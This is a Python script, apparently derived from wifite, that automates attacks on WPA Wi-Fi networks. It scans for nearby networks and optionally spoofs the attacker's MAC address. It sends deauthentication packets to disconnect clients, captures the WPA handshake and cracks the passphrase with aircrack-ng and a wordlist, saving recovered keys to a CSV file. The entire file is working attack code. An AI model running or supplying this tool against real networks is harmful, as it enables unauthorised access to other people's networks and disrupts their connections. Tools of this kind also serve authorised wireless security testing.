#!/usr/bin/python3
import csv  # Exporting and importing cracked aps
import os  # File management
import time  # Measuring attack intervals
import random  # Generating a random MAC address.
import errno  # Error numbers

import sys  # Flushing

from shutil import copy  # Copying .cap files

# Executing, communicating with, killing processes
from subprocess import Popen, call, PIPE, DEVNULL
from signal import SIGINT, SIGTERM

import re  # RegEx, Converting SSID to filename
import argparse  # arg parsing

################################
# GLOBAL VARIABLES IN ALL CAPS #
################################

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

# Basic console colors
colors = {
    'W': '\033[0m',  # white (normal)
    'R': '\033[31m',  # red
    'G': '\033[32m',  # green
    'O': '\033[33m',  # orange
    'B': '\033[34m',  # blue
    'P': '\033[35m',  # purple
    'C': '\033[36m',  # cyan
    'GR': '\033[37m',  # gray
    'D': '\033[2m'  # dims current color. {W} resets.
}

# Helper string replacements
replacements = {
    '{+}': '{W}{D}[{W}{G}+{W}{D}]{W}',
    '{!}': '{W}{D}[{W}{R}!{W}{D}]{W}',
    '{?}': '{W}{D}[{W}{C}?{W}{D}]{W}'
}


def color(text):
    ''' Returns colored string '''
    output = text
    for (key, value) in replacements.items():
        output = output.replace(key, value)
    for (key, value) in colors.items():
        output = output.replace('{%s}' % key, value)
    return output


###################
# DATA STRUCTURES #
###################

mac_pattern = re.compile('([A-F0-9]{2}:){5}[A-F0-9]{2}', re.I)


def mac_search(string):
    try:
        mac_addr = re.search(mac_pattern, string).group()
        return mac_addr
    except:
        return ""


def program_exists(program):
    """
        Uses 'which' (linux command) to check if a program is installed.
    """
    proc = Popen(['which', program],
                 stdout=PIPE,
                 stderr=PIPE,
                 encoding='utf-8')
    txt = proc.communicate()
    if txt[0].strip() == '' and txt[1].strip() == '':
        return False
    if txt[0].strip() != '' and txt[1].strip() == '':
        return True

    return not (txt[1].strip() == ''
                or txt[1].find('no %s in' % program) != -1)


def sec_to_hms(sec):
    """
        Converts integer sec to h:mm:ss format
    """
    if sec <= -1: return '[endless]'
    h = sec / 3600
    sec %= 3600
    m = sec / 60
    sec %= 60
    return '[%02d:%02d:%02d]' % (h, m, sec)


def send_interrupt(process):
    """
        Sends interrupt signal to process's PID.
    """
    try:
        os.kill(process.pid, SIGINT)
        # os.kill(process.pid, SIGTERM)
    except OSError:
        pass  # process cannot be killed
    except TypeError:
        pass  # pid is incorrect type
    except UnboundLocalError:
        pass  # 'process' is not defined
    except AttributeError:
        pass  # Trying to kill "None"


def generate_random_mac(old_mac):
    """
        Generates a random MAC address.
        Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
        Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
    """
    random.seed()
    new_mac = old_mac[:8].lower().replace('-', ':')
    for i in range(0, 6):
        if i % 2 == 0: new_mac += ':'
        new_mac += '0123456789abcdef'[random.randint(0, 15)]

    # Prevent generating the same MAC address via recursion.
    if new_mac == old_mac:
        new_mac = generate_random_mac(old_mac)
    return new_mac


def parse_targets(filename):
    """
        Parses given lines from airodump-ng CSV file.
        Returns list: List of targets and targets info.
    """
    if not os.path.exists(filename): return []
    targets = {}
    try:
        hit_clients = False
        with open(filename, 'r') as csvfile:
            targetreader = csv.reader(csvfile)
            for row in targetreader:
                if len(row) < 2:
                    continue
                if not hit_clients:
                    if row[0].strip() == 'Station MAC':
                        hit_clients = True
                        continue
                    if len(row) < 14:
                        continue
                    if row[0].strip() == 'BSSID':
                        continue
                    enc = row[5].strip()
                    wps = 'no'
                    # Ignore non-WPA and non-WEP encryption
                    if enc.find('WPA') == -1 and enc.find('WEP') == -1:
                        continue
                    if enc.find('WEP') != -1: continue
                    if enc == "WPA2WPA" or enc == "WPA2 WPA":
                        enc = "WPA2"
                        wps = 'wps'
                    if len(enc) > 4:
                        enc = enc[4:].strip()
                    power = int(row[8].strip())
                    ssid = row[13].strip()
                    ssidlen = int(row[12].strip())
                    ssid = ssid[:ssidlen]
                    bssid = mac_search(row[0])
                    if power < 0: power += 100
                    if bssid:
                        targets[bssid] = [
                            ssid, row[3].strip(), enc, power, wps, 0
                        ]
                else:
                    if len(row) < 6:
                        continue
                    station = mac_search(row[5])
                    if station and station in targets.keys():
                        targets[station][5] = targets[station][5] + 1
        targets = sorted(targets.items(),
                         key=lambda item: item[1][3],
                         reverse=True)
    except IOError as e:
        print("I/O error({0}): {1}".format(e.errno, e.strerror))
        return []
    return targets


def parse_clients(filename):
    """
        Parses given lines from airodump-ng CSV file.
        Returns list: List of target's clients.
    """
    if not os.path.exists(filename): return []
    clients = []
    try:
        hit_clients = False
        with open(filename, 'r') as csvfile:
            clientreader = csv.reader(csvfile)
            for row in clientreader:
                if len(row) < 2:
                    continue
                if not hit_clients:
                    if row[0].strip() == 'Station MAC':
                        hit_clients = True
                    continue
                else:
                    if len(row) < 6:
                        continue
                    client = mac_search(row[0])
                    if client:
                        clients.append(client)
    except IOError as e:
        print("I/O error({0}): {1}".format(e.errno, e.strerror))
        return []
    return clients


class Wpa_Attack:
    def __init__(self):
        self.iface = ""
        self.origin_mac = ""
        self.current_mac = ""
        self.channel = ""
        self.target_bssid = ""
        self.target_channel = ""
        self.target_essid = ""
        self.target_key = ""
        self.WPA_DEAUTH_COUNT = 1
        self.WPA_ATTACK_TIMEOUT = 300
        self.WPA_DEAUTH_TIMEOUT = 10
        self.WPA_DICTIONARY = ""
        self.DO_NOT_CHANGE_MAC = True

        self.tempdir = sys.path[0] + os.sep + 'temp'
        if not os.path.exists(self.tempdir):
            os.mkdir(self.tempdir)
        self.wpa_handshakedir = sys.path[0] + os.sep + 'handshake'
        if not os.path.exists(self.wpa_handshakedir):
            os.mkdir(self.wpa_handshakedir)
        self.cracked_csv = sys.path[0] + os.sep + 'cracked.csv'
        if not os.path.exists(self.cracked_csv):
            with open(self.cracked_csv, 'w') as f:
                f.write("SSID,BSSID,PASSWORD\n")

    def ConfirmRunningAsRoot(self):
        if os.getuid() != 0:
            print(R + ' [!]' + O + ' ERROR:' + G + 'wpa_crack' + O +
                  ' must be run as ' + R + 'root' + W)
            print(R + ' [!]' + O + ' login as root (' + W + 'su root' + O +
                  ') or try ' + W + 'sudo ./wpa_crack.py' + W)
            exit(1)

    def ConfirmCorrectPlatform(self):
        if not os.uname()[0].startswith(
                "Linux") and not 'Darwin' in os.uname()[0]:
            print(O + ' [!]' + R + ' WARNING:' + G + ' wpa_crack' + W +
                  ' must be run on ' + O + 'linux' + W)
            exit(1)

    def initial_check(self):
        """
            Ensures required programs are installed.
        """
        airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng']
        for air in airs:
            if program_exists(air): continue
            print(R + ' [!]' + O + ' required program not found: %s' %
                  (R + air + W))
            print(R + ' [!]' + O +
                  ' this program is bundled with the aircrack-ng suite:' + W)
            print(R + ' [!]' + O + '        ' + C +
                  'http://www.aircrack-ng.org/' + W)
            print(R + ' [!]' + O + ' or: ' + W +
                  'sudo apt-get install aircrack-ng\n' + W)
            exit(1)

        if not program_exists('iwconfig'):
            print(R + ' [!]' + O + ' wifite requires the program %s\n' %
                  (R + 'iwconfig' + W))
            exit(1)

        if not program_exists('ifconfig'):
            print(R + ' [!]' + O + ' wifite requires the program %s\n' %
                  (R + 'ifconfig' + W))
            exit(1)

    def build_opt_parser(self):
        argparser = argparse.ArgumentParser()
        argparser.add_argument(
            '--dict',
            help='Specificy dictionary to use when cracking WPA.',
            action='store',
            dest='dic')
        argparser.add_argument('-dict',
                               help=argparse.SUPPRESS,
                               action='store',
                               dest='dic')
        argparser.add_argument('--mac',
                               help='Anonymize MAC address.',
                               action='store_true',
                               default=False,
                               dest='mac_anon')
        argparser.add_argument('-mac',
                               help=argparse.SUPPRESS,
                               action='store_true',
                               default=False,
                               dest='mac_anon')
        argparser.add_argument('-c',
                               help='Channel to scan for targets.',
                               action='store',
                               dest='channel')
        return argparser

    def handle_args(self):
        """
            Handles command-line arguments, sets global variables.
        """
        opt_parser = self.build_opt_parser()
        options = opt_parser.parse_args()
        try:
            if options.dic:
                try:
                    self.WPA_DICTIONARY = options.dic
                except IndexError:
                    print(R + ' [!]' + O + ' no WPA dictionary given!')
                else:
                    if os.path.exists(options.dic):
                        print(GR + ' [+]' + W + ' WPA dictionary set to %s' %
                              (G + self.WPA_DICTIONARY + W))
                    else:
                        print(R + ' [!]' + O +
                              ' WPA dictionary file not found: %s' %
                              (options.dic))
            if options.channel:
                try:
                    self.channel = int(options.channel)
                except ValueError:
                    print(O + ' [!]' + R + ' invalid channel: ' + O +
                          options.channel + W)
                except IndexError:
                    print(O + ' [!]' + R + ' no channel given!' + W)
                else:
                    print(GR + ' [+]' + W + ' channel set to %s' %
                          (G + str(self.channel) + W))
            if options.mac_anon:
                print(GR + ' [+]' + W + ' mac address anonymizing ' + G +
                      'enabled' + W)
                print(
                    O +
                    '     not: only works if device is not already in monitor mode!'
                    + W)
                self.DO_NOT_CHANGE_MAC = False
        except IndexError:
            print('\nIndexerror')

    def start_monitor_mode(self):
        self.mac_anonymize()
        proc = Popen(['iwconfig', self.iface],
                     stdout=PIPE,
                     stderr=DEVNULL,
                     encoding='utf-8')
        if proc.communicate()[0].find('Mode:Monitor') == -1:
            call(['airmon-ng', 'start', self.iface],
                 stdout=DEVNULL,
                 stderr=DEVNULL)
            print(O + ' [!] ' + W + 'Start Wireless interface Monitor mode: ' +
                  O + self.iface + W)
            proc = Popen(['iwconfig'],
                         stdout=PIPE,
                         stderr=DEVNULL,
                         encoding='utf-8')
            for line in proc.communicate()[0].split('\n'):
                if ord(line[0]) != 32 and line.find(
                        'Mode:Monitor') != -1:  # Doesn't start with space
                    self.iface = line[:line.find(' ')]  # is the interface
                    break
                elif ord(line[0]) != 32 and line.find('Mode:Monitor') == -1:
                    print(
                        R + ' [!] ' + O + self.iface + W +
                        "doesn't support monitor mode,please change other wireless"
                    )
                    self.stop_monitor_mode()
                    exit(1)

    def stop_monitor_mode(self):
        proc = Popen(['iwconfig', self.iface],
                     stdout=PIPE,
                     stderr=DEVNULL,
                     encoding='utf-8')
        if proc.communicate()[0].find('Mode:Monitor') != -1:
            call(['airmon-ng', 'stop', self.iface],
                 stdout=DEVNULL,
                 stderr=DEVNULL)
            print(O + ' [!] ' + W + 'Stop Wireless interface Monitor mode: ' +
                  O + self.iface + W)
        self.mac_change_back()

    def initial_ifaces(self):
        proc = Popen(['iwconfig'],
                     stdout=PIPE,
                     stderr=DEVNULL,
                     encoding='utf-8')
        for line in proc.communicate()[0].split('\n'):
            if len(line) == 0: continue
            if ord(line[0]) != 32:  # Doesn't start with space
                self.iface = line[:line.find(' ')]  # is the interface
                self.stop_monitor_mode()
        self.iface = ""

    def get_iface(self):
        print(GR + ' [+]' + W + ' scanning for wireless devices...')
        proc = Popen(['iwconfig'],
                     stdout=PIPE,
                     stderr=DEVNULL,
                     encoding='utf-8')
        ifaces = []
        for line in proc.communicate()[0].split('\n'):
            if len(line) == 0: continue
            if ord(line[0]) != 32:
                ifaces.append(line[:line.find(' ')])
        if len(ifaces) > 1:
            print(GR + " [+] " + W + "Found " + G + str(len(ifaces)) + W +
                  " wireless devices...")
            sys.stdout.write(GR + " [+] " + W)
            for num, iface in enumerate(ifaces):
                sys.stdout.write(G + str(num + 1) + GR + ':' + C + iface + W +
                                 '\t')
            sys.stdout.flush()
            print('')
            try:
                while not self.iface:
                    ri=input(GR + " [+] " + W + "Please select the wireless number "+ G +\
                        "[1-%s]"%(len(ifaces))+ W + ": ")
                    if int(ri) >= 1 and int(ri) <= len(ifaces): break
                self.iface = ifaces[int(ri) - 1]
            except KeyboardInterrupt:
                print('\n ' + R + '(^C)' + O + ' interrupted' + W)
                exit(1)
        elif len(ifaces) == 1:
            self.iface = ifaces[0]
        else:
            print(R + ' [!]' + O + " no wireless interfaces were found." + W)
            print(R + ' [!]' + O +
                  " you need to plug in a wifi device or install drivers." + W)
            exit(1)

    def mac_anonymize(self):
        """
            Changes MAC address of 'iface' to a random MAC.
            Only randomizes the last 6 digits of the MAC, so the vender says the same.
            Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
        """
        if self.DO_NOT_CHANGE_MAC: return
        proc = Popen(['ifconfig', self.iface],
                     stdout=PIPE,
                     stderr=DEVNULL,
                     encoding='utf-8')
        proc.wait()
        self.origin_mac = mac_search(proc.communicate()[0])
        if self.origin_mac:
            self.current_mac = generate_random_mac(self.origin_mac)
            call(['ifconfig', self.iface, 'down'])
            sys.stdout.write(GR + " [+]" + W + " changing %s's MAC from %s to %s..." % \
                (G + self.iface + W, G + self.origin_mac + W, O + self.current_mac + W))
            sys.stdout.flush()
            proc = Popen(
                ['ifconfig', self.iface, 'hw', 'ether', self.current_mac],
                stdout=PIPE,
                stderr=DEVNULL)
            proc.wait()
            call(['ifconfig', self.iface, 'up'],
                 stdout=DEVNULL,
                 stderr=DEVNULL)
            print('done')

    def mac_change_back(self):
        """
            Changes MAC address back to what it was before attacks began.
        """
        if self.current_mac:
            sys.stdout.write(GR + " [+]" + W + " changing %s's mac back to %s..." % \
                (G + self.iface + W, G + self.origin_mac + W))
            sys.stdout.flush()

            call(['ifconfig', self.iface, 'down'],
                 stdout=DEVNULL,
                 stderr=DEVNULL)
            proc = Popen(
                ['ifconfig', self.iface, 'hw', 'ether', self.origin_mac],
                stdout=PIPE,
                stderr=DEVNULL)
            proc.wait()
            call(['ifconfig', self.iface, 'up'],
                 stdout=DEVNULL,
                 stderr=DEVNULL)
            print("done")
        else:
            return

    def scan(self):
        self.get_iface()
        self.start_monitor_mode()
        airodump_file_prefix = os.path.join(self.tempdir, 'wifite')
        csv_file = airodump_file_prefix + '-01.csv'
        temp_file = self.tempdir + os.sep + '*'
        os.system('rm -rf ' + temp_file)
        command = [
            'airodump-ng',
            '-a',  # only show associated clients
            '--write-interval',
            '1',  # Write every second
            '-w',
            airodump_file_prefix
        ]  # output file
        if self.channel:
            command.append('-c')
            command.append(str(self.channel))
        command.append(self.iface)
        proc = Popen(command, stdout=DEVNULL, stderr=DEVNULL, encoding='utf-8')
        time_started = time.time()
        print(GR + ' [+] ' + G + 'initializing scan' + W + ' (' + G + self.iface + W + \
            '), updates at 1 sec intervals, ' + G + 'CTRL+C' + W + ' when ready.')
        self.targets = {}
        try:
            while True:
                time.sleep(0.3)
                self.targets = parse_targets(csv_file)
                if self.targets:
                    os.system('clear')
                    print(GR + '\n [+] ' + G + 'scanning' + W + ' (' + G + self.iface + W + \
                        '), updates at 1 sec intervals, ' + G + 'CTRL+C' + W + ' when ready.\n')
                    self.display_targets()
                print('\n %s %s wireless networks. %s target%s found...\r' % (
                    GR + sec_to_hms(time.time() - time_started) + W,
                    G + 'scanning' + W,
                    G + str(len(self.targets)) + W,
                    '' if len(self.targets) == 1 else 's',
                ),
                      end='')
        except KeyboardInterrupt:
            pass
        print('')
        send_interrupt(proc)
        try:
            os.kill(proc.pid, SIGTERM)
        except OSError:
            pass
        except UnboundLocalError:
            pass
        self.targets = parse_targets(csv_file)
        if self.targets:
            os.system('clear')
            self.display_targets()
            try:
                while not self.target_bssid:
                    ri = input(GR + "\n [+]" + W + " select " + G + "target number" + W + \
                        " (" + G + "1-%s): " % (str(len(self.targets)) + W))
                    if int(ri) >= 1 and int(ri) <= len(self.targets): break
                self.target_bssid = self.targets[int(ri) - 1][0]
                self.target_channel = self.targets[int(ri) - 1][1][1]
                self.target_essid = self.targets[int(ri) - 1][1][0]
            except KeyboardInterrupt:
                print('\n ' + R + '(^C)' + O + ' interrupted' + W)
                self.stop_monitor_mode()
                exit(1)
        else:
            print(R + ' [!]' + O + ' no targets found!' + W)
            print(R + ' [!]' + O +
                  ' you may need to wait for targets to show up.' + W)
            self.stop_monitor_mode()
            exit(1)

    def display_targets(self):
        print(" " + "-" * 75)
        print(" %-4s %-19s %-17s  %-2s  %-4s  %-5s  %4s %s"\
            %('NUM','ESSID','BSSID','CH','ENCR','POWER','WPS?',' CLIENT'))
        print(" " + "-" * 75)
        num = 1
        for target in self.targets:
            essid = target[1][0]
            if essid == '' or '\x00' in essid or '\\x00' in essid:
                essid = O + '(' + target[0] + ')' + W
                essid = essid.ljust(19)
            elif len(essid) <= 19:
                essid = C + essid.ljust(19) + W
            else:
                essid = C + essid[0:16] + '...' + W
            bssid = P + target[0] + W
            channel = G + target[1][1].rjust(2) + W
            encryption = O + target[1][2].ljust(4) + W
            power = target[1][3]
            if power >= 55:
                power = G + str(power).rjust(5) + W
            elif power >= 40:
                power = O + str(power).rjust(5) + W
            else:
                power = R + str(power).rjust(5) + W
            wps = target[1][4]
            if wps == 'wps':
                wps = G + wps.ljust(4) + W
            else:
                wps = R + wps.ljust(4) + W
            client = target[1][5]
            if client == 1:
                client = G + ' client' + W
            elif client > 1:
                client = O + str(client) + G + 'clients' + W
            else:
                client = ""
            sys.stdout.write(" %-4s %-19s %-17s  %-2s  %-4s  %-5s  %4s %s\n"\
                %(G+str(num).ljust(4)+W,essid,bssid,channel,encryption,power,wps,client))
            num += 1
        sys.stdout.flush()

    def has_handshake(self, capfile):
        """
            Uses aircrack-ng to check for handshake.
            Returns True if found, False otherwise.
        """
        # if not program_exists('aircrack-ng'): return False
        crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + self.target_bssid + ' ' + capfile
        proc_crack = Popen(crack,
                           stdout=PIPE,
                           stderr=DEVNULL,
                           shell=True,
                           encoding='utf-8')
        proc_crack.wait()
        txt = proc_crack.communicate()[0]

        return (txt.find('Passphrase not in dictionary') != -1)

    def wpa_crack(self, capfile):
        """
            Cracks cap file using aircrack-ng
            This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
            they can do so manually.
        """
        print(GR + '\n [00:00:00]' + W + ' cracking %s with %s' %
              (G + self.target_essid + W, G + 'aircrack-ng' + W))
        wpakey_file = self.tempdir + os.sep + 'wpakey.txt'
        output_file = self.tempdir + os.sep + 'output.txt'
        cmd = [
            'aircrack-ng',
            '-a',
            '2',  # WPA crack
            '-w',
            self.WPA_DICTIONARY,  # Wordlist
            '-l',
            wpakey_file,  # Save key to file
            '-b',
            self.target_bssid,  # BSSID of target
            capfile
        ]

        proc = Popen(cmd,
                     stdout=open(output_file, 'a'),
                     stderr=DEVNULL,
                     encoding='utf-8')
        try:
            pattern = re.compile('\[([0-9][0-9]:){2}[0-9]{2}\].*k/s\)')
            while True:
                time.sleep(1)

                if proc.poll() != None:  # aircrack stopped
                    if os.path.exists(wpakey_file):
                        # Cracked
                        inf = open(wpakey_file)
                        self.target_key = inf.read().strip()
                        inf.close()

                        print(GR + '\n [+]' + W + ' cracked %s (%s)!' % \
                            (G + self.target_essid + W, G + self.target_bssid + W))
                        print(GR + ' [+]' + W + ' key:    "%s"\n' %
                              (C + self.target_key + W))
                        with open(self.cracked_csv, 'a') as f:
                            f.write(self.target_essid + ',' +
                                    self.target_bssid + ',' + self.target_key +
                                    '\n')
                    else:
                        print(R + '\n [!]' + R + 'crack attempt failed' + O +
                              ': passphrase not in dictionary' + W)
                    break

                inf = open(output_file, 'r')
                lines = inf.read().split('\n')
                inf.close()
                outf = open(output_file, 'w')
                outf.close()
                for line in lines:
                    match = re.search(pattern, line)
                    if match:
                        print("\r %-70s" % \
                            (GR + match.group() + W),end='')
                        sys.stdout.flush()
                        break

        except KeyboardInterrupt:
            print(R + '\n (^C)' + O + ' WPA cracking interrupted' + W)

        send_interrupt(proc)
        try:
            os.kill(proc.pid, SIGTERM)
        except OSError:
            pass

    def wpa_get_handshake(self):
        file_prefix = os.path.join(self.tempdir, 'handshake')
        csv_file = file_prefix + '-01.csv'
        temp_cap_file = file_prefix + '-01.cap'
        try:
            cmd = [
                'airodump-ng', '-w', file_prefix, '-c', self.target_channel,
                '--write-interval', '1', '--bssid', self.target_bssid,
                self.iface
            ]
            proc_read = Popen(cmd,
                              stdout=DEVNULL,
                              stderr=DEVNULL,
                              encoding='utf-8')
            proc_deauth = None
            start_time = time.time()
            seconds_running = 0
            seconds_since_last_deauth = 8
            print(' %s starting %swpa handshake capture%s on "%s"' % \
                  (GR + sec_to_hms(self.WPA_ATTACK_TIMEOUT) + W, G, W, G + self.target_essid + W))
            got_handshake = False
            start_time = time.time()
            while not got_handshake and seconds_running < self.WPA_ATTACK_TIMEOUT:
                time.sleep(1)
                seconds_since_last_deauth += int(time.time() - start_time -
                                                 seconds_running)
                seconds_running = int(time.time() - start_time)
                print(
                    "                                                          \r",
                    end='')
                print(' %s listening for handshake...\r' % \
                      (GR + sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running) + W),end='')
                sys.stdout.flush()
                if seconds_since_last_deauth > self.WPA_DEAUTH_TIMEOUT:
                    seconds_since_last_deauth = 0
                    clients = parse_clients(csv_file)
                    if clients:
                        for client in clients:
                            time.sleep(0.5)
                            cmd = [
                                'aireplay-ng',
                                '--ignore-negative-one',
                                '--deauth',
                                str(self.WPA_DEAUTH_COUNT
                                    ),  # Number of packets to send
                                '-a',
                                self.target_bssid
                            ]
                            cmd.append('-c')
                            cmd.append(client)
                            cmd.append(self.iface)
                            proc_deauth = Popen(cmd,
                                                stdout=DEVNULL,
                                                stderr=DEVNULL)
                            proc_deauth.wait()
                            print(" %s sending %s deauth to %s...\r" % \
                                  (GR + sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running) + W, \
                                   G + str(self.WPA_DEAUTH_COUNT) + W, G + client + W),end='')
                            sys.stdout.flush()
                    else:
                        print(" %s sending %s deauth to %s*broadcast*%s...      \r" % \
                              (GR + sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running) + W,
                               G + str(self.WPA_DEAUTH_COUNT) + W, G, W),end='')
                        sys.stdout.flush()
                        time.sleep(1)
                if self.has_handshake(temp_cap_file):
                    got_handshake = True
            if not got_handshake:
                print(R + ' [00:00:00]' + O +
                      ' unable to capture handshake in time' + W)
                self.stop_monitor_mode()
            else:
                send_interrupt(proc_read)
                send_interrupt(proc_deauth)
                cap_file = self.wpa_handshakedir + os.sep + re.sub(r'[^a-zA-Z0-9_-]', '', \
                    self.target_essid) + '_' + self.target_bssid.replace(':', '-') + '_' + \
                str(time.strftime("%M%S",time.localtime())) + '.cap'
                copy(temp_cap_file, cap_file)
                print("\n %s %shandshake captured%s! saved as:" \
                    % (GR + sec_to_hms(seconds_running) + W, O, W))
                print('            "%s"' % (C + cap_file + W))
                cap2hccapx = sys.path[0] + os.sep + 'cap2hccapx.bin'
                if os.path.exists(cap2hccapx):
                    try:
                        call([cap2hccapx, cap_file, cap_file[:-3] + 'hccapx'],
                             stdout=DEVNULL,
                             stderr=DEVNULL)
                    except:
                        pass
                self.stop_monitor_mode()
                if self.WPA_DICTIONARY == '':
                    print(
                        R + ' [!]' + O +
                        ' no WPA dictionary found! use -dict <file> command-line argument'
                        + W)
                else:
                    self.wpa_crack(cap_file)

        except KeyboardInterrupt:
            print(R + '\n (^C)' + O + ' WPA handshake capture interrupted' + W)
            send_interrupt(proc_read)
            send_interrupt(proc_deauth)
            self.stop_monitor_mode()

    def Start(self):
        self.handle_args()
        self.initial_check()
        self.ConfirmRunningAsRoot()
        self.ConfirmCorrectPlatform()
        self.initial_ifaces()
        self.scan()
        self.wpa_get_handshake()


if __name__ == '__main__':
    wpa_attack = Wpa_Attack()
    wpa_attack.Start()
